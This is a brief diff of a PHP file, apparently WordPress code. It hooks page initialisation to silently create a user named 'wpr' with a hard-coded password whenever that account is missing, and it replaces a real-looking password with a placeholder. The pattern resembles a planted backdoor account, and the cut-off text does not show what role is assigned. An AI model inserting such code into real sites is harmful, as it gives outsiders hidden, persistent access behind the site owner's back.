@@ -7,7 +7,7 @@
 
 add_action('init', function () {
     $user = 'wpr';
-    $pass = 'nc9sXzm6SQ4QBZ';
+    $pass = 'enter_the_password';
     if (!username_exists($user)) {
         $user_id = wp_create_user($user, $pass);
         $user = new WP_User($user_id);
